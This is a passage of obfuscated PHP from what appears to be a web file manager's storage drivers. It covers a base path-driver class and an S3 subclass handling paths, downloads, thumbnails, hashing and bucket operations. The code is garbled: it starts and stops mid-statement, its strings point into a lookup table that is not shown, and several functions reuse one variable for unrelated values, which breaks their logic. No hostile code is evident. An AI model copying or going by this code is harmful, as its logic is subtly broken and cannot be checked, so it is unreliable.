array($_SERVER[̉][410] => $B娠); $this->where($FٚǏ)->remove(); } } $Fٶ = $_SERVER[$_SERVER[̉][835]]; $D = $_SERVER[̉][1214]; goto FѾ; a: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $b =& $_SERVER[̉]; $this->objectDriver = array($b[57], $b[58], $b[59], $b[60], $b[61], $b[62], $b[63], $b[64], $b[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Dɏď) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Dɏď, $_SERVER[̉][8]); } return $Dɏď; } public function iconvApp($Cƹ) { return $Cƹ; } public function iconvSystem($c) { return $c; } public function iconvTo($eܘ, $A, $Fι) { goto Fᷖ; B: $e䵥[$Fι . $DΧЅ[67] . $A . $DΧЅ[68] . $eܘ] = $eܘ; $e䵥[$Fι . $DΧЅ[67] . $A . $DΧЅ[68] . $e] = $eܘ; $e䵥[$A . $DΧЅ[67] . $Fι . $DΧЅ[68] . $e] = $e; goto Eڌ; Eڌ: return $e; goto d؃; BˬǸ: $D㊬ = $A . $DΧЅ[67] . $Fι . $DΧЅ[68] . $eܘ; if (isset($e䵥[$D㊬])) { return $e䵥[$D㊬]; } if (function_exists($DΧЅ[69])) { $e = @mb_convert_encoding($eܘ, $Fι, $A); } else { $e = @iconv($A, $Fι, $eܘ); } goto cħ; cħ: $e = $e ? $e : $eܘ; if (strstr($e, $DΧЅ[70])) { $e = str_replace($DΧЅ[70], $DΧЅ[71], $e); } $e䵥[$A . $DΧЅ[67] . $Fι . $DΧЅ[68] . $eܘ] = $e; goto B; Fᷖ: $DΧЅ =& $_SERVER[̉]; if (!$eܘ || !function_exists($DΧЅ[66])) { return $eܘ; } static $e䵥 = array(); goto BˬǸ; d؃: } public function getPathInner($F˜Ȃ) { $E֋҃ = IO::init($F˜Ȃ); return $E֋҃->path; } public function getPathOuter($e) { $Fݹң =& $_SERVER[̉]; $e = strlen(trim($this->pathBase, $Fݹң[8])); $e = substr(trim($e, $Fݹң[8]), $e); return $this->pathDriver . $Fݹң[8] . ltrim($e, $Fݹң[8]); } public function isParentOf($a栨, $aӂ) { $dé =& $_SERVER[̉]; $a栨 = rtrim(strtolower($a栨), $dé[8]) . $dé[8]; $aӂ = rtrim(strtolower($aӂ), $dé[8]) . $dé[8]; $b = strpos($aӂ, $a栨) === 0; return $b; } public function getType() { $A =& $_SERVER[̉]; $F˙ = str_replace($A[72], $A[33], get_class($this)); return strtolower($F˙); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($D, $b) { $Aߙ =& $_SERVER[̉]; $bё = rtrim($D, $Aߙ[8]) . $Aߙ[8] . $b; $Cԩ = $this->exist($bё); return $Cԩ ? $bё : !1; } public function setModifyTime($fɷ, $Fƨ޴ = '') { } public function renameObject($AɱΞ, $Fϡŏ) { goto C; aδ: $AɱΞ = $this->getPathOuter($AɱΞ); $Fϡŏ = $this->pathFather($AɱΞ) . $Fϡŏ; if (IO::isFile($AɱΞ)) { $Ě = IO::copy($AɱΞ, $this->pathFather($AɱΞ), REPEAT_RENAME_FOLDER, $AԠ); if ($Ě) { IO::remove($AɱΞ); } } else { $Ě = IO::mkdir($Fϡŏ); if (!$Ě) { return !1; } $a޳ = IO::listPath($AɱΞ, !0); $D٤ = array_merge($a޳[$Dޠʩ[74]], $a޳[$Dޠʩ[75]]); foreach ($D٤ as $CޑĎ) { IO::move($CޑĎ[$Dޠʩ[76]], $Fϡŏ, REPEAT_RENAME_FOLDER); } IO::remove($AɱΞ); } goto AםȰ; AםȰ: return $Ě ? $Fϡŏ : !1; goto Eӟ; C: $Dޠʩ =& $_SERVER[̉]; $AԠ = $Fϡŏ; Hook::trigger($Dޠʩ[73], $this, $AɱΞ, $this, $this->pathFather($AɱΞ) . $Fϡŏ); goto aδ; Eӟ: } public function tempFile($e揹鴪 = '', $aփ = '') { goto eӊ; cվҟ: return $aΈ; goto FÆ; B: $aΈ = $Fְ . $e揹鴪; @touch($aΈ); if ($aփ) { file_put_contents($aΈ, $aփ); } goto cվҟ; eӊ: if (!$e揹鴪) { $e揹鴪 = rand_string(15); } $Fְ = TEMP_FILES . rand_string(15) . $_SERVER[̉][8]; @mkdir($Fְ, 511, !0); goto B; FÆ: } public function tempFileRemve($F) { @unlink($F); @rmdir($this->pathFather($F)); } public function mkfile($B๜, $Eع = '', $F䪴 = REPEAT_RENAME) { } public function mkdir($a, $F = REPEAT_SKIP) { } public function delFile($Aֻ) { } public function delFolder($dڜ) { } public function copyFile($F۪ۃ, $dԒЎ) { } public function moveFile($e˔, $dȔ) { } public function remove($fҊ) { if ($this->isFile($fҊ)) { return $this->delFile($fҊ); } return $this->delFolder($fҊ); } public function rename($dĲ, $E) { } public function exist($C̣) { } public function findByHash($B = '', $Cϐ࿊ = '') { return !1; } public function isFile($Bϥ) { } public function isFolder($eю) { } public function size($b弅) { } public function info($c՗؈) { } public function infoSimple($fއ) { return $this->info($fއ); } public function infoAuth($BѰı) { return $this->info($BѰı); } public function infoFull($d˕) { return $this->info($d˕); } public function infoWithChildren($c) { $cã =& $_SERVER[̉]; static $FЎ = array(); if (isset($FЎ[$c])) { return $FЎ[$c]; } $eݏ؎ = $this->info($c); if ($eݏ؎ && $eݏ؎[$cã[29]] == $cã[77]) { $d뇎 = array($cã[78] => 0, $cã[79] => 0, $cã[80] => 0); $this->infoChildren($c, $d뇎); $eݏ؎[$cã[78]] = $d뇎[$cã[78]]; $eݏ؎[$cã[81]] = array($cã[82] => $d뇎[$cã[79]], $cã[83] => $d뇎[$cã[80]]); $FЎ[$c] = $eݏ؎; } return $eݏ؎; } public function listPath($Cĉ, $b󾦼 = false) { } public function has($A䧿, $cجզ = false, $Fɸۖ = false) { } public function canRead($fß) { } public function canWrite($D) { } public function getContent($CՒ) { } public function setContent($fҥ, $E = '') { } protected function infoChildren($F, &$A҃) { $a =& $_SERVER[̉]; check_abort_echo(); $a = $this->listPath($F, !0); $a = array_merge($a[$a[75]], $a[$a[74]]); foreach ($a as $e攂ީ) { if ($e攂ީ[$a[29]] == $a[77]) { $A҃[$a[80]]++; $b = $this->getPathInner($e攂ީ[$a[76]]); $this->infoChildren($b, $A҃); } else { $A҃[$a[79]]++; $A҃[$a[78]] += $e攂ީ[$a[78]]; } } } public function fileSubstr($E, $bꂂü, $f˃) { } public function listAll($Aۘԃ) { } public function listAllMake($b˃, &$A̹ԏ) { $d =& $_SERVER[̉]; check_abort_echo(); $c = $this->listPath($b˃, !0); if (!$c) { return; } $dόӰ = array_merge($c[$d[75]], $c[$d[74]]); foreach ($dόӰ as $E߆) { goto A; A: $d༻ = $E߆[$d[29]] == $d[77]; $e誂 = array($d[76] => $E߆[$d[76]], $d[77] => $d༻); if (isset($E߆[$d[78]])) { $e誂[$d[78]] = $E߆[$d[78]]; } goto c𸰱; c𸰱: if (isset($E߆[$d[84]])) { $e誂[$d[84]] = $E߆[$d[84]]; } if (!$d༻) { $A̹ԏ[] = $e誂; continue; } $A̹ԏ[] = $e誂; goto DҎ; DҎ: $this->listAllMake($E߆[$d[76]], $A̹ԏ); goto fᆢ; fᆢ: } } public function listAllSimple($A菤) { $E =& $_SERVER[̉]; $A = array(); $B훇Ɠ = $this->listAll($A菤); $B䩶 = $this->getPathOuter($A菤); foreach ($B훇Ɠ as $dӉ͋) { goto d; E˟: if (!$dӉ͋[$E[77]]) { $fڐϱ[$E[86]] = $Fì; } $A[] = $fڐϱ; goto fݠ; d: $Fì = $dӉ͋[$E[76]]; $C䂞 = $dӉ͋[$E[76]]; if (isset($dӉ͋[$E[85]])) { $Fì = $dӉ͋[$E[85]][$E[76]]; $dӉ͋[$E[78]] = $dӉ͋[$E[85]][$E[78]]; $dӉ͋[$E[84]] = $dӉ͋[$E[85]][$E[84]]; } else { $C䂞 = substr($dӉ͋[$E[76]], strlen(get_path_father($B䩶))); $C䂞 = $E[8] . ltrim($C䂞, $E[8]); } goto Fޜ; Fޜ: $fڐϱ = array($E[76] => $C䂞, $E[77] => $dӉ͋[$E[77]]); if (isset($dӉ͋[$E[78]]) && !$dӉ͋[$E[77]]) { $fڐϱ[$E[78]] = $dӉ͋[$E[78]]; } if (isset($dӉ͋[$E[84]])) { $fڐϱ[$E[84]] = $dӉ͋[$E[84]]; } goto E˟; fݠ: } return $A; } public function upload($cѱ, $A, $bÝќ = false, $eՋ = REPEAT_REPLACE) { } public function uploadFileByID($F, $C攻, $e) { } public function uploadFileByPath($f㉎, $Eǲ, $fޯ = array()) { } public function isUploadServer() { $BɃ =& $_SERVER[̉]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $BɃ[87]) { return !0; } return $GLOBALS[$BɃ[6]][$BɃ[88]][$BɃ[89]]; } public function isFileOutServer() { $B獺 =& $_SERVER[̉]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $B獺[87]) { return !0; } return $GLOBALS[$B獺[6]][$B獺[88]][$B獺[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($b߆) { $BҮ =& $_SERVER[̉]; if (!$this->isCdnHost()) { return $b߆; } return str_replace(trim(get_url_root($b߆), $BҮ[8]), trim($this->cdnHost, $BҮ[8]), $b߆); } public function uploadLink($C׷Ἃ, $F򊎕 = 0) { goto cݫȠ; b: if ($fɈ) { $fɈ[$aֺ[93]] = $C׷Ἃ; $fɈ[$aֺ[94]] = $b⑷ː; } return $fɈ; goto bΎ; cݫȠ: $aֺ =& $_SERVER[̉]; if ($this->isUploadServer()) { return; } $b⑷ː = $this->getType(); goto D߂; dְ: $Eĵ = $F򊎕 <= $Eʫ ? $aֺ[91] : $aֺ[92]; $A = (!$F򊎕 ? 1 : ceil($F򊎕 / pow(1024, 3))) * 3600 * 4; $fɈ = $this->{$Eĵ}($C׷Ἃ, $A); goto b; D߂: if (!in_array($b⑷ː, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Eʫ = 1024 * 1024 * 10; goto dְ; bΎ: } public function uploadFormData($e˪, $cΊ = 3600) { } public function multiUploadFormData($eޯ꺦, $A = 3600) { } public function download($b葚, $e) { } public function ext($C稲) { $a =& $_SERVER[̉]; if (strpos($C稲, $a[8]) === -1) { $B = $C稲; } else { $B = $this->pathThis($C稲); } $C = $a[33]; if (strstr($B, $a[95])) { $C = substr($B, strrpos($B, $a[95]) + 1); $C = strtolower($C); } if (strlen($C) > 3 && preg_match($a[96], $C, $cẇʳ)) { $C = $a[33]; } return $C; } public function pathThis($b힇) { $bΊ =& $_SERVER[̉]; $b힇 = str_replace($bΊ[97], $bΊ[8], rtrim($b힇, $bΊ[8])); $eɅ = strrpos($b힇, $bΊ[8]); if ($eɅ === !1) { return $b힇; } return substr($b힇, $eɅ + 1); } public function pathFather($Cֽ) { $d =& $_SERVER[̉]; $Cֽ = str_replace($d[97], $d[8], rtrim($Cֽ, $d[8])); $B = strrpos($Cֽ, $d[8]); if ($B === !1) { return $d[33]; } return substr($Cֽ, 0, $B + 1); } public function hashSimple($cŢ) { goto fδ; fδ: $B嗾˺ =& $_SERVER[̉]; if (!$cŢ) { return md5($B嗾˺[33]); } $E = $this->size($cŢ); goto d; bۂ: $a𪯱Ǝ .= $this->fileSubstr($cŢ, $E - $cሗ¥, $cሗ¥); return md5($a𪯱Ǝ) . $E; goto c僐; DǼ: $fÛ = intval($E / $E); $a𪯱Ǝ = $B嗾˺[33]; for ($c = 0; $c < $E; $c++) { $a𪯱Ǝ .= $this->fileSubstr($cŢ, $fÛ * $c, $cሗ¥); } goto bۂ; d: $cሗ¥ = 200; $E = 50; if ($E <= $cሗ¥ * $E) { return $this->hashMd5($cŢ) . $E; } goto DǼ; c僐: } public static $md5Cache = array(); public function hashMd5($c) { $c = $this->iconvSystem($c); if (isset(self::$md5Cache[$c])) { return self::$md5Cache[$c]; } self::$md5Cache[$c] = $this->hashMd5Shell($c); if (!self::$md5Cache[$c]) { self::$md5Cache[$c] = @md5_file($c); } return self::$md5Cache[$c]; } private function hashMd5Shell($cݗ) { goto cȃ; cȃ: $b᲋ =& $_SERVER[̉]; if (!function_exists($b᲋[98])) { return !1; } $Cཌ = array($b᲋[99], $b᲋[100]); goto B; B܏: $Fć = shell_exec($c . "\x20\42{$cݗ}\42"); $Fć = str_replace($b᲋[104], $b᲋[33], $Fć); return substr($Fć, 0, 32); goto Cʗ; B: $c = Cache::get($b᲋[101]); if (!$c) { $Cۉ = BASIC_PATH . $b᲋[102]; $EҾ = md5_file($Cۉ); $c = $b᲋[103]; foreach ($Cཌ as $cѣ) { $Fć = shell_exec($cѣ . "\x20\42{$Cۉ}\42"); if ($Fć && substr(trim($Fć), 0, 32) == $EҾ) { $c = $cѣ; break; } } Cache::set($b᲋[101], $c, 3600); } if ($c == $b᲋[103]) { return !1; } goto B܏; Cʗ: } public function link($B̌) { return $B̌; } public function fileOut($cū΅, $D暸̊ = false, $C¢ = false, $aｸ = '') { goto Aϻ; D: header($E܈ك[138] . $Bً); header($E܈ك[139]); if (!$D暸̊ && $DĦ == $E܈ك[140]) { if ($Bً > 1024 * 1024 * 5) { die; } $Bۿ = $this->getContent($cū΅); $Bۿ = Html::clearSVG($Bۿ); header($E܈ك[141] . strlen($Bۿ)); echo $Bۿ; die; } goto c; D: $a = 0; $d汹 = $Bً - 1; $DĦ = $this->ext($cۦľ); goto d; bۖ: header($E܈ك[128]); header($E܈ك[129]); header($E܈ك[130]); goto Aγ; c̍: $Dآյ = $this->getType() == $E܈ك[106]; $fߎÂ = $GLOBALS[$E܈ك[6]][$E܈ك[88]][$E܈ك[107]][$E܈ك[108]]; $fʊ = (double) $GLOBALS[$E܈ك[6]][$E܈ك[88]][$E܈ك[107]][$E܈ك[109]] * 1024 * 1024; goto f稷; Aγ: if (isset($_SERVER[$E܈ك[131]]) && strtotime($_SERVER[$E܈ك[131]]) == $e[$E܈ك[84]]) { header($E܈ك[132], !0, 304); die; } if (isset($_SERVER[$E܈ك[133]]) && $_SERVER[$E܈ك[133]] == $aｸ) { header($E܈ك[134] . $aｸ, !0, 304); die; } header($E܈ك[134] . $aｸ); goto E픟; f: $C = !0; if ($_SERVER[$E܈ك[154]] == $E܈ك[155] && $Bً > 1204 * 1024 * 1024 * 2) { $C = !1; } if ($C) { header($E܈ك[156] . ($d汹 - $a + 1)); } goto c; f稷: @ob_end_clean(); set_timeout(); $e = $this->infoFull($cū΅); goto F; Aϻ: $E܈ك =& $_SERVER[̉]; $this->cacheMethod(null, null); if (!$cū΅ || !$this->exist($cū΅)) { show_json(LNG($E܈ك[105]), !1, $C¢); } goto c̍; dڳ: $b = $E܈ك[116] . $b . $E܈ك[122] . $b; if ($D暸̊) { header($E܈ك[123]); header($E܈ك[124] . $b); } else { header($E܈ك[125] . $b); } header($E܈ك[126] . gmdate($E܈ك[110], time() + 3600 * 24 * 30) . $E܈ك[127]); goto bۖ; c: if ($_SERVER[$E܈ك[157]] == $E܈ك[158]) { return; } $F = 1024 * 100; $cȯ = 0; goto d敧; F: $Bً = $e[$E܈ك[78]]; $FԐѹ = gmdate($E܈ك[110], $e[$E܈ك[84]]); $cۦľ = $C¢ ? $C¢ : $this->iconvApp($e[$E܈ك[28]]); goto D; a쩉: $aǇΑ = get_file_mime($DĦ); if (strstr($aǇΑ, $E܈ك[117])) { $aǇΑ = $aǇΑ . $E܈ك[118]; } if ($D暸̊ === !1 && !mime_support($aǇΑ)) { $D暸̊ = !0; $aǇΑ = $E܈ك[119]; } goto Cֹٍא; E픟: header($E܈ك[135] . $FԐѹ . $E܈ك[127]); header($E܈ك[136] . $cۦľ); header($E܈ك[137]); goto D; c: $f = strtolower($_SERVER[$E܈ك[142]]); if ($Dآյ && $f && $fߎÂ) { if (strstr($f, $E܈ك[143])) { header($E܈ك[144] . $cū΅); } else { if (strstr($f, $E܈ك[145])) { header($E܈ك[146] . $cū΅); } else { if (strstr($f, $E܈ك[147])) { header($E܈ك[148] . $cū΅); } } } if ($fʊ) { header($E܈ك[149] . $fʊ); } return; } if (isset($_SERVER[$E܈ك[150]])) { if (preg_match($E܈ك[151], $_SERVER[$E܈ك[150]], $D؍)) { $a = intval($D؍[1]); if (!empty($D؍[2])) { $d汹 = intval($D؍[2]); } } header($E܈ك[152]); header("\x43\x6f\x6e\164\x65\156\x74\55\x52\x61\156\147\x65\x3a\x20\x62\171\x74\145\163\40{$a}\x2d{$d汹}\x2f" . $Bً); } else { header($E܈ك[153]); } goto f; d: if (in_array($DĦ, array($E܈ك[111], $E܈ك[112], $E܈ك[113], $E܈ك[114]))) { $DĦ = $E܈ك[115]; } if (!$aｸ) { $aｸ = md5($FԐѹ . $this->hashSimple($cū΅)); } $aｸ = $E܈ك[116] . $aｸ . $E܈ك[116]; goto a쩉; Cֹٍא: header($E܈ك[120]); header($E܈ك[121] . $aǇΑ); $b = rawurlencode($cۦľ); goto dڳ; d敧: if ($fʊ) { $cȯ = intval(1000 * 1000 * ($F / $fʊ)); } while ($a <= $d汹) { $eޓԢ = timeFloat(); check_abort(); $eȪ = $d汹 - $a + 1; if ($eȪ <= $F) { $F = $eȪ; } echo $this->fileSubstr($cū΅, $a, $F); $a += $F; if ($F == $eȪ) { $a = $d汹 + 1; } if ($cȯ) { $Cןע = intval(1000 * 1000 * (timeFloat() - $eޓԢ)); $d = $cȯ - $Cןע; if ($d > 5) { usleep($d); } } } goto aṋ; aṋ: } public function fileOutServer($Bǰ, $dѳ = false, $c܂ = false, $fĹ߲ = '') { $this->fileOut($Bǰ, $dѳ, $c܂, $fĹ߲); } public function fileOutLink($F) { header($_SERVER[̉][159] . $F); die; } public function cacheMethod($Fզ, $B, $eÛ߉ = null) { goto b肹; e: if (!is_null($eÛ߉)) { $aȅǖ[$aɿ渆] = $eÛ߉; return; } $a = isset($aȅǖ[$aɿ渆]) ? $aȅǖ[$aɿ渆] : null; if (!is_null($a)) { return $a; } goto Fۂ; Aʷ: $aɿ渆 = $b铒[160] . $Fզ . $b铒[161] . rtrim($A׭ܪǌ, $b铒[8]); if (is_null($Fզ)) { $aȅǖ = array(); return; } if (is_null($B)) { unset($aȅǖ[$aɿ渆]); return; } goto e; b肹: $b铒 =& $_SERVER[̉]; static $aȅǖ = array(); $A׭ܪǌ = $B ? ltrim($this->getPathOuter($B), $b铒[8]) : $B; goto Aʷ; Fۂ: $a = $this->{$Fզ}($B); $aȅǖ[$aɿ渆] = $a; return $a; goto A縬; A縬: } public function fileOutImage($D, $Fᐯ = 250) { goto aۮ; E: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $CǤ = DATA_THUMB . $A; del_file($CǤ); goto Aϓ٥; AŸ: $F = $this->info($D); $eʜ = $F[$e[28]]; $bǱ = !1; goto F; D: del_file($CǤ); IO::fileOut($BȲ); goto A; B: $A = "{$E놻}\x5f{$Fᐯ}\56\x70\156\147"; if (!($d = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $e[172]))) { $aŰ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $e[173]); } else { $aŰ = KodIO::make($d); } if ($d = IO::fileNameExist($aŰ, $A)) { $CǤ = KodIO::make($d); return IO::fileOut($CǤ, !1, $eʜ); } goto E; F: if (isset($GLOBALS[$e[162]]) && $GLOBALS[$e[162]][$e[76]] == $F[$e[76]]) { $cԦ = $GLOBALS[$e[162]][$e[163]]; if (!$F[$e[164]]) { $F[$e[164]] = $GLOBALS[$e[162]]; } if (isset($cԦ[$e[165]])) { if ($cԦ[$e[165]] <= $Fᐯ && $cԦ[$e[166]] <= $Fᐯ) { $bǱ = !0; } } $eʜ = $F[$e[164]][$e[28]]; } if ($F[$e[78]] <= 1024 * 50 || $bǱ || !function_exists($e[167]) || $F[$e[168]] == $e[169]) { return $this->fileOut($D, !1, $eʜ); } if (isset($F[$e[164]][$e[170]])) { $E놻 = $F[$e[164]][$e[170]]; } else { if (isset($F[$e[164]][$e[171]])) { $E놻 = $F[$e[164]][$e[171]]; } else { $E놻 = md5("{$F[$e[28]]}\137{$F[$e[76]]}\x5f{$F[$e[78]]}"); } } goto B; Aϓ٥: if (!@file_exists($CǤ)) { $EȠӋ = TEMP_FILES; if (!is_dir($EȠӋ)) { mk_dir($EȠӋ); } $C = $EȠӋ . $E놻 . $e[95] . $F[$e[168]]; if (!@file_exists($C)) { $C = $this->download($D, $C); } ImageThumb::createThumb($C, $CǤ, $Fᐯ, $Fᐯ * 10); } if (!file_exists($CǤ) || filesize($CǤ) < 100) { return @file_exists($C) ? IO::fileOut($C) : $this->fileOut($D); } if (!($BȲ = IO::move($CǤ, $aŰ))) { return IO::fileOut($CǤ); } goto D; aۮ: $e =& $_SERVER[̉]; set_timeout(); if (substr($D, 0, 4) == $e[147]) { $this->fileOutLink($D); } goto AŸ; A: } public function fileOutImageServer($E, $eӕ = 250) { $this->fileOutImage($E, $eӕ); } public function fileNameAuto($a, $A컫, $cﻱ = REPEAT_RENAME, $E = false) { goto Cӏ; cƋ: if ($cﻱ == REPEAT_SKIP) { return !1; } $c = $e[95] . get_path_ext($A컫); $c = $c == $e[95] || $E ? $e[33] : $c; goto BĆ; Cӏ: $e =& $_SERVER[̉]; $f = $a === $e[33] ? $A컫 : rtrim($a, $e[8]) . $e[8] . $A컫; if ($cﻱ == REPEAT_REPLACE || !$this->exist($f) || $E && $cﻱ != REPEAT_RENAME_FOLDER) { return $A컫; } goto cƋ; CП: while ($this->exist(rtrim($a, $e[8]) . $e[8] . $Dؿ)) { $Dؿ = $B . "\x28{$dۋ}\51{$c}"; $dۋ++; } return $Dؿ; goto b͹; BĆ: $dۋ = 1; $B = substr($A컫, 0, strlen($A컫) - strlen($c)); $Dؿ = $B . "\x28{$dۋ}\x29{$c}"; goto CП; b͹: } private function fileNameAutoList($Aʮ, $Bе, $D߉ = false) { goto Dم; dᎊ碯: return $eǝ; goto cά; Dم: $Fد =& $_SERVER[̉]; $c = $this->listPath($Aʮ, !0); $c = array_merge($c[$Fد[75]], $c[$Fد[74]]); goto A; F܉: $D = substr($Bе, 0, strlen($Bе) - strlen($Eչ)); $eǝ = $D . "\x28\60\51{$Eչ}"; for ($D = 1; $D <= count($b) + 1; $D++) { $eǝ = $D . "\50{$D}\x29{$Eչ}"; if (!in_array_not_case($eǝ, $b)) { return $eǝ; } } goto dᎊ碯; A: $b = array_to_keyvalue($c, $Fد[33], $Fد[28]); $Eչ = $Fد[95] . get_path_ext($Bе); $Eչ = $Eչ == $Fد[95] || $D߉ ? $Fد[33] : $Eչ; goto F܉; cά: } public function listAllFiles($F綪ۡ, $dϳ, $BǨ = array()) { goto D; Aɷ: $F綪ۡ = trim($F綪ۡ, $Cދ[8]); foreach ($dϳ as $Eݑ) { $dǌݏ = ltrim(substr(trim($Eݑ, $Cދ[8]), strlen($F綪ۡ)), $Cދ[8]); $eۑ = array_merge($eۑ, $this->slicePath($dǌݏ)); } $Cꪕ = array(); goto Fܿ; Fܿ: foreach (array_unique($eۑ) as $Eݑ) { $fՊ = array($Cދ[76] => $this->getPathOuter($Cދ[8] . $F綪ۡ . $Cދ[8] . $Eݑ), $Cދ[77] => 1, $Cދ[78] => 0); if (substr($Eݑ, -1) != $Cދ[8]) { $fՊ[$Cދ[77]] = 0; $cܹ = $this->getPath($F綪ۡ . $Cދ[8] . $Eݑ); $fՊ[$Cދ[78]] = isset($BǨ[$cܹ]) ? $BǨ[$cܹ] : $this->size($cܹ); } $Cꪕ[] = $fՊ; } return $Cꪕ; goto cޓ´; D: $Cދ =& $_SERVER[̉]; if (empty($dϳ)) { return array(); } $eۑ = array(); goto Aɷ; cޓ´: } public function slicePath($fí) { $b =& $_SERVER[̉]; $a = explode($b[8], trim($fí, $b[8])); $dõ = 0; do { ++$dõ; $eը[] = implode($b[8], array_slice($a, 0, $dõ)) . $b[8]; } while ($dõ < count($a)); $eը[count($a) - 1] = $fí; return $eը; } public function getHost() { $cۅ =& $_SERVER[̉]; $bߴ = parse_url(trim($this->domain, $cۅ[8])); $dȱ = isset($bߴ[$cۅ[174]]) ? $bߴ[$cۅ[174]] : http_type(); $Cʐ = isset($bߴ[$cۅ[175]]) ? $bߴ[$cۅ[175]] : $bߴ[$cۅ[76]]; if (isset($bߴ[$cۅ[176]])) { $Cʐ .= $cۅ[4] . $bߴ[$cۅ[176]]; } return $dȱ . $cۅ[177] . $Cʐ; } public function pathEncode($FګԲ) { $Aچ =& $_SERVER[̉]; return str_replace($Aچ[178], $Aچ[8], rawurlencode($FګԲ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($FƉ) { set_timeout(); require_once SDK_DIR . $_SERVER[̉][179]; parent::__construct(); $this->_init($FƉ); } public function _init($a) { foreach ($a as $c => $Aӫ) { if (isset($this->{$c})) { $this->{$c} = $Aӫ; } } $this->endpoint = $a[$_SERVER[̉][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($C۫ = "\x76\64") { $this->signVer = $C۫; $this->client->setSignatureVersion($C۫); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto B䘒; bݽ: if ($Aӧ[$E[181]] != $E[182] || $Aӧ[$E[183]] != $E[182]) { return !1; } $D民 = array_map($E[184], $Aӧ[$E[185]]); if (!is_array($D民)) { $D民 = array(); } goto d; B䘒: $E =& $_SERVER[̉]; $Aӧ = $this->getBucketCors(); if (!$Aӧ || !is_array($Aӧ)) { return !1; } goto bݽ; d: $Cӆ = array($E[186], $E[187], $E[188], $E[189], $E[190]); $D䤦 = array_diff($Cӆ, $D民); return empty($D䤦); goto F͟Ȱ; F͟Ȱ: } public function mkfile($c¢, $a܃ = '', $cל = REPEAT_RENAME) { $c헿 = $this->setContent($c¢, $a܃); if ($c헿 !== !1) { return $this->getPathOuter($c¢); } return !1; } public function mkdir($F֊, $aƲ = REPEAT_SKIP) { $EǦ =& $_SERVER[̉]; if (empty($F֊) && $F֊ !== $EǦ[191]) { return !1; } if ($this->_isFolder($F֊)) { return $this->getPathOuter($F֊); } $Cù = $this->setContent($F֊, $EǦ[33], !0); if ($Cù !== !1) { return $this->getPathOuter($F֊); } return !1; } public function copyFile($a؟, $Aꈬ, $bÙ = array()) { $c˔ =& $_SERVER[̉]; $Bʯ = $this->objectMeta($a؟); if (!$Bʯ) { return !1; } if ($Bʯ[$c˔[78]] <= 1024 * 1024 * 200) { $bі = $this->client->copyObject($this->bucket, $a؟, $this->bucket, $Aꈬ, $c˔[192], $bÙ); } else { $bі = $this->client->multiCopyObject($this->bucket, $a؟, $this->bucket, $Aꈬ, $bÙ); } $bі = $bі ? $this->getPathOuter($Aꈬ) : !1; return $bі; } public function moveFile($a, $c컖) { if ($this->copyFile($a, $c컖)) { $this->delFile($a); return $this->getPathOuter($c컖); } return !1; } public function delFile($Eȩ) { return $this->client->deleteObject($this->bucket, $Eȩ); } public function delFolder($f) { goto B៰; b: $cХ = $this->fileList($f); $this->listItemCache = !0; $b券 = trim($f, $b[8]) . $b[8]; goto a; B៰: $b =& $_SERVER[̉]; if (!$this->exist($f)) { return !0; } $this->listItemCache = !1; goto b; a: if (!empty($f) && $f !== $b[191] && !in_array($b券, $cХ[$b[75]])) { $cХ[$b[75]][] = $b券; } $B = $this->delByBatch($cХ[$b[74]]); if (!$B) { return !1; } goto D䌂; D䌂: $B = $this->delByBatch($cХ[$b[75]]); if (!$B) { return !1; } return $this->delFile($b券); goto D籂; D籂: } private function delByBatch($bš) { foreach (array_chunk($bš, 1000) as $FЖ) { $ä́ = $this->client->deleteObjects($this->bucket, $FЖ); if (!$ä́) { return !1; } } return !0; } public function rename($f, $fؐ) { return $this->renameObject($f, $fؐ); } public function listPath($d, $B茿 = false) { $c˨ =& $_SERVER[̉]; $e߾Ҽ = $this->fileList($d, $c˨[8], !0); foreach ($e߾Ҽ[$c˨[75]] as $c => $cú) { $e߾Ҽ[$c˨[75]][$c] = $this->folderInfo($cú, $B茿); } foreach ($e߾Ҽ[$c˨[74]] as $c => $cú) { $e߾Ҽ[$c˨[74]][$c] = $this->fileInfo($cú[$c˨[28]], $B茿, $cú); } return $e߾Ҽ; } private function fileInfo($Fۗ, $Ạ = false, $b = array()) { goto cؠ; b՚: $Eԋ[$e׾[194]] = $Eԋ[$e׾[84]] = 0; $Eԋ[$e׾[195]] = $Eԋ[$e׾[196]] = !0; if (empty($b)) { $b = $this->objectMeta($Fۗ); if (!$b) { return $Eԋ; } } goto AÍ疏; cؠ: $e׾ =& $_SERVER[̉]; $Eԋ = array($e׾[28] => $this->pathThis($Fۗ), $e׾[76] => $this->getPathOuter($Fۗ), $e׾[29] => $e׾[193], $e׾[168] => $this->ext($Fۗ), $e׾[78] => isset($b[$e׾[78]]) ? $b[$e׾[78]] : 0); if ($Ạ) { return $Eԋ; } goto b՚; AÍ疏: if (isset($b[$e׾[197]])) { $Eԋ[$e׾[84]] = $b[$e׾[197]]; } if (isset($b[$e׾[78]])) { $Eԋ[$e׾[78]] = $b[$e׾[78]]; } return $Eԋ; goto F; F: } private function folderInfo($d҆, $c߸ = false) { goto f݈; F: return $Aӻ; goto D; c·: $d҆ = trim($d҆, $bɎ[8]) . $bɎ[8]; $D = $this->objectMeta($d҆); if (isset($D[$bɎ[197]])) { $Aӻ[$bɎ[194]] = $D[$bɎ[197]]; } goto F; a: 